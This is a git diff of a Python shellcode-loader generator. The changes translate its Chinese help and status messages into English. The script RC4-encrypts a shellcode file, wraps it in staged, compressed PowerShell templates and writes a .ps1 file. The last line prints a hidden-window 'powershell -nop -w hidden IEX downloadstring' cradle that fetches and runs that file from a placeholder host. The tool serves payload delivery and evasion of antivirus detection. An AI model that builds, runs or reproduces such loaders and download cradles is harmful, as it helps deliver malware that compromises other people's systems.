@@ -31,10 +31,10 @@ def Rc4Encrypt(key, data):
     return bytes(output)
 
 
-parser = argparse.ArgumentParser(description='powershell一句话上线便捷生成器.')
-parser.add_argument('-input', help='输入的shellcode文件' ,required=True)
-parser.add_argument('-arch', type=int, choices=[0, 1], help='输入的shellcode的位数(0为32位 1为64位)',required=True)
-parser.add_argument('-output', default="one_liner.ps1", help='输出的ps1文件名')
+parser = argparse.ArgumentParser(description='powershell one-liner generator.')
+parser.add_argument('-input', help='input shellcode filename' ,required=True)
+parser.add_argument('-arch', type=int, choices=[0, 1], help='shellcode arch(0 for 32 bit, 1 for 64bit)',required=True)
+parser.add_argument('-output', default="one_liner.ps1", help='out ps1 filename')
 
 args = parser.parse_args()
 
@@ -172,10 +172,10 @@ fileData = None
 with open(args.input, "rb") as file:
     fileData = file.read()
 
-print(f'[-] shellcode大小:{len(fileData)}B')
+print(f'[-] shellcode size:{len(fileData)}B')
 
 rc4Key = GenerateRandomString()
-print(f'[-] rc4密钥为:{rc4Key}')
+print(f'[-] rc4 key is:{rc4Key}')
 
 fileData = Rc4Encrypt(rc4Key.encode('ascii'), fileData)
 
@@ -185,10 +185,10 @@ b64Str = b64Data.decode('ascii')
 
 # print(templateStage2x86)
 if args.arch == 0:
-    print('[-] shellcode为32位')
+    print('[-] shellcode 32-bit')
     stage2 = templateStage2x86 % (b64Str, rc4Key)
 else:
-    print('[-] shellcode为64位')
+    print('[-] shellcode 64-bit')
     stage2 = templateStage2x64 % (b64Str, rc4Key)
 
 # print(stage2)
@@ -198,9 +198,9 @@ b64CompressedStr = base64.b64encode(compressedData)
 stage1 = templateStage1 % (b64CompressedStr.decode('ascii'))
 # print(stage1)
 
-print(f'[-] 准备写入输出到文件:{args.output} 大小:{len(stage1)}B')
+print(f'[-] write to output file:{args.output} file size:{len(stage1)}B')
 with open(args.output, 'w', encoding = 'utf-8') as f:
     f.write(stage1)
 
-print(f'[-] 一句话:powershell.exe -nop -w hidden -c "IEX((new-object net.webclient).downloadstring(\'http://xxxx.com/{args.output}\'))"')    
+print(f'[-] one-liner:powershell.exe -nop -w hidden -c "IEX((new-object net.webclient).downloadstring(\'http://xxxx.com/{args.output}\'))"')    
 
